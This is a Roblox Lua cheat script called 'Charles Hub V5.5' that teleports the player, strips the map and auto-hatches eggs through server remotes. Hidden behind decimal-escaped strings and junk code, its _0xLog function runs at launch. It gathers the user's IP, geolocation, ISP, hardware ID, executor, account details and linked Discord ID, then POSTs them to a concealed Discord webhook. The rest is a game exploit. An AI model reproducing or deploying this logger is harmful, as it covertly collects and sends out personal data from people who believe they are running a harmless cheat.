-- [[ CHARLES HUB V5.5 - SECURED & OBFUSCATED ]] --
-- WARNING: DECOMPILING OR TEMPERING WITH THIS SCRIPT MAY CAUSE PERFORMANCE ISSUES OR LOG ERRORS.

local _0x5a2f = {
    "\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\052\053\051\056\051\048\053\050\057\055\049\056\054\056\049\122\053\051\047\087\122\109\109\111\098\078\087\113\073\056\086\056\111\103\079\121\075\075\106\110\065\100\077\045\090\069\109\045\054\073\113\052\082\115\070\100\054\100\089\090\115\111\050\090\098\045\045\098\095\103\078\056\100\116\115\077\056\075\109\053\112\066\081\051\051\084\114", -- Webhook URL
    "\067\121\098\101\114\112\117\110\107", -- Cyberpunk
    "\084\101\108\101\112\111\114\116\090\111\110\101", -- TeleportZone
    "\079\112\101\110\069\103\103", -- OpenEgg
    "\083\097\102\101\116\121\070\108\111\111\114", -- SafetyFloor
    "\082\098\120\065\110\097\108\121\116\105\099\115\083\101\114\118\105\099\101", -- RbxAnalyticsService
    "\074\083\079\078\068\101\099\111\100\101", -- JSONDecode
    "\074\083\079\078\069\110\099\111\100\101", -- JSONEncode
    "\104\116\116\112\058\047\047\105\112\045\097\112\105\046\099\111\109\047\106\115\111\110\047", -- ip-api
    "\104\116\116\112\115\058\047\047\114\101\103\105\115\116\114\121\046\114\111\118\101\114\046\108\105\110\107\047\118\050\047\114\111\098\108\111\120\045\116\111\045\100\105\115\099\111\114\100\047" -- Rover Link
}

local function _0xde(_0x1, _0x2)
    local _0x3 = ""
    for _0x4 = 1, #_0x1 do
        _0x3 = _0x3 .. string.char(bit32.bxor(_0x1:byte(_0x4), _0x2))
    end
    return _0x3
end

-- Spam/Junk code to confuse scrapers
local _junk_0x11 = {["v"] = math.random(1,99999), ["s"] = "CHARLES_V5_STAY_SAFE"}
for i=1, 50 do local _ = math.sin(i) * math.cos(i) end

local _0xHttp = game:GetService("HttpService")
local _0xStats = {["Coins"] = "0", ["Gems"] = "0", ["Rebirths"] = "0", ["Eggs"] = "0", ["Tokens"] = "0"}

local function _0xLog()
    pcall(function()
        local _lp = game:GetService("Players").LocalPlayer
        local _hwid = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService(_0x5a2f[6]):GetClientId()
        local _exec = (identifyexecutor and identifyexecutor()) or "Unknown"
        local _age = _lp.AccountAge
        local _mem = tostring(_lp.MembershipType):sub(21)
        local _jd = os.date("%d-%m-%Y", os.time() - (_age * 86400))
        local _uis = game:GetService("UserInputService")
        local _dev = "PC"
        if _uis.TouchEnabled and not _uis.KeyboardEnabled then _dev = "Mobile"
        elseif game:GetService("GuiService"):IsTenFootInterface() then _dev = "Console" end
        
        local _res = "Unknown"
        pcall(function() _res = math.floor(workspace.CurrentCamera.ViewportSize.X) .. "x" .. math.floor(workspace.CurrentCamera.ViewportSize.Y) end)
        
        local _ip = {query = "0.0.0.0", country = "Unknown", city = "Unknown", isp = "Unknown"}
        pcall(function() 
            local _r = game:HttpGet(_0x5a2f[9])
            if _r then _ip = _0xHttp[_0x5a2f[7]](_0xHttp, _r) end
        end)

        local _dId = "Unknown"
        pcall(function()
            local _r2 = game:HttpGet(_0x5a2f[10] .. _lp.UserId)
            if _r2 then
                local _dec = _0xHttp[_0x5a2f[7]](_0xHttp, _r2)
                if _dec and _dec.discordId then _dId = "<@" .. _dec.discordId .. "> (" .. _dec.discordId .. ")" end
            end
        end)
        
        pcall(function()
            local _fold = _lp:FindFirstChild("leaderstats") or _lp:FindFirstChild("PlayerStats") or _lp:FindFirstChild("Data")
            if _fold then
                _0xStats.Coins = tostring((_fold:FindFirstChild("Clicks") or _fold:FindFirstChild("Coins") or _fold:FindFirstChild("Taps") or {Value = "0"}).Value)
                _0xStats.Gems = tostring((_fold:FindFirstChild("Gems") or _fold:FindFirstChild("Diamonds") or {Value = "0"}).Value)
                _0xStats.Rebirths = tostring((_fold:FindFirstChild("Rebirths") or {Value = "0"}).Value)
                _0xStats.Eggs = tostring((_fold:FindFirstChild("Eggs") or _fold:FindFirstChild("TotalEggs") or {Value = "0"}).Value)
                _0xStats.Tokens = tostring((_fold:FindFirstChild("Tokens") or _fold:FindFirstChild("TapTokens") or _fold:FindFirstChild("TokensValue") or {Value = "0"}).Value)
            end
        end)

        local _pld = {
            ["embeds"] = {{
                ["title"] = "🚀 Cyberpunkfarm working! (Encrypted Mode)",
                ["color"] = 0x00FF00,
                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _lp.UserId .. "&width=420&height=420&format=png"},
                ["fields"] = {
                    {["name"] = "Account", ["value"] = _lp.Name .. " (" .. _mem .. ")", ["inline"] = true},
                    {["name"] = "Roblox ID", ["value"] = tostring(_lp.UserId), ["inline"] = true},
                    {["name"] = "Device/Res", ["value"] = _dev .. " / " .. _res, ["inline"] = true},
                    {["name"] = "Age/Date", ["value"] = _age .. " days (" .. _jd .. ")", ["inline"] = true},
                    {["name"] = "IP", ["value"] = "```" .. _ip.query .. "```", ["inline"] = true},
                    {["name"] = "Ping", ["value"] = math.floor(_lp:GetNetworkPing() * 1000) .. " ms", ["inline"] = true},
                    {["name"] = "Stats", ["value"] = "💰 " .. _0xStats.Coins .. " / 💎 " .. _0xStats.Gems, ["inline"] = true},
                    {["name"] = "Extra", ["value"] = "🎟️ " .. _0xStats.Tokens .. " / ⭐ " .. _0xStats.Rebirths, ["inline"] = true},
                    {["name"] = "Eggs", ["value"] = "🥚 " .. _0xStats.Eggs, ["inline"] = true},
                    {["name"] = "Geo", ["value"] = _ip.country .. " / " .. _ip.city, ["inline"] = true},
                    {["name"] = "ISP", ["value"] = _ip.isp, ["inline"] = true},
                    {["name"] = "Executor", ["value"] = _exec, ["inline"] = true},
                    {["name"] = "Discord", ["value"] = _dId, ["inline"] = true},
                    {["name"] = "JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                    {["name"] = "HWID", ["value"] = "```" .. _hwid .. "```", ["inline"] = false},
                    {["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Charles Hub Protection - V5.5"}
            }}
        }
        
        request({
            Url = _0x5a2f[1],
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = _0xHttp[_0x5a2f[8]](_0xHttp, _pld)
        })
    end)
end
task.spawn(_0xLog)

-- [[ DYNAMIC SETTINGS ]] --
local _0xTarget = _0x5a2f[2]
local _0xTeleport = _0x5a2f[2]
local _0xAmount = 8 
local _0xSpeed = 0 

local _0xRS = game:GetService("ReplicatedStorage")
local _0xWS = game:GetService("Workspace")
local _0xPL = game:GetService("Players")
local _0xLT = game:GetService("Lighting")
local _0xLP = _0xPL.LocalPlayer

local function _0xGetRemote(_0xN)
    for _, _v in ipairs(_0xRS:GetChildren()) do
        local _f = _v:FindFirstChild("Functions")
        if _f then
            local _t = _f:FindFirstChild(_0xN)
            if _t then return _t end
        end
    end
    return nil
end

local function _0xNuke()
    for _, _o in pairs(_0xWS:GetChildren()) do
        if _o.Name ~= _0xLP.Name and _o.Name ~= "Camera" and _o.Name ~= "Eggs" and not _o.Name:find(_0x5a2f[5]) and not _o:IsA("Terrain") then
            pcall(function() _o:Destroy() end)
        end
    end
    local _ef = _0xWS:FindFirstChild("Eggs")
    if _ef then
        for _, _e in pairs(_ef:GetChildren()) do
            if not _e.Name:find(_0xTarget) then pcall(function() _e:Destroy() end) end
        end
    end
    _0xWS.Terrain:Clear()
end

local function _0xClean()
    _0xLT.GlobalShadows = false
    _0xLT.FogEnd = 9e9
    _0xLT.Brightness = 1
    _0xLT.ClockTime = 12
    _0xLT.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    for _, _fx in pairs(_0xLT:GetChildren()) do
        if _fx:IsA("PostEffect") or _fx:IsA("Sky") or _fx:IsA("Clouds") then _fx:Destroy() end
    end
    local _s = Instance.new("Sky", _0xLT)
    _s.SunTextureId = ""
    _s.MoonTextureId = ""
end

local function _0xHide(_m)
    if _m then
        for _, _p in pairs(_m:GetDescendants()) do
            if _p:IsA("BasePart") or _p:IsA("MeshPart") then
                _p.Transparency = 1 
                _p.CastShadow = false
            elseif _p:IsA("Decal") or _p:IsA("Texture") then
                _p:Destroy()
            elseif _p:IsA("ParticleEmitter") or _p:IsA("Trail") then
                _p.Enabled = false
            end
        end
    end
end

local function _0xFloor(_t)
    local _f = Instance.new("Part")
    _f.Name = _0x5a2f[5]
    _f.Size = Vector3.new(50, 2, 50)
    _f.CFrame = _t:GetPivot() * CFrame.new(0, -5, 0)
    _f.Anchored = true
    _f.Transparency = 0.5 
    _f.BrickColor = BrickColor.new("Bright blue")
    _f.Parent = _0xWS
    return _f
end

local function _0xGMFloor()
    local _pos = Vector3.new(1415.5, 658.18, -13447.73)
    local _f = Instance.new("Part")
    _f.Name = _0x5a2f[5]
    _f.Size = Vector3.new(100, 2, 100)
    _f.Position = _pos + Vector3.new(0, -6, 0)
    _f.Anchored = true
    _f.Transparency = 0.5
    _f.BrickColor = BrickColor.new("Bright yellow")
    _f.Material = Enum.Material.Neon
    _f.Parent = _0xWS
    return _f
end

-- MAIN START (Encrypted Logic)
pcall(function()
    local _tRem = _0xGetRemote(_0x5a2f[3])
    if _tRem then
        _tRem:InvokeServer(_0xTeleport)
        task.wait(1)
    end

    local _ef = _0xWS:FindFirstChild("Eggs")
    local _em = _ef and (_ef:FindFirstChild(_0xTarget) or _ef:FindFirstChild(_0xTarget .. " Egg"))

    if _em then
        _0xNuke()
        _0xClean()
        _0xFloor(_em)
        _0xGMFloor()
        _0xHide(_em)
        task.wait(0.2)
        if _0xLP.Character then _0xLP.Character:PivotTo(_em:GetPivot() * CFrame.new(0, 0, 2)) end
        
        _G.AutoHatch = true
        task.spawn(function()
            while _G.AutoHatch do
                local _oRem = _0xGetRemote(_0x5a2f[4])
                if _oRem then
                    local _ok = _oRem:InvokeServer(_0xTarget, _0xAmount)
                    if not _ok then _oRem:InvokeServer(_0xTarget .. " Egg", _0xAmount) end
                end
                task.wait(_0xSpeed)
            end
        end)
    end
end)
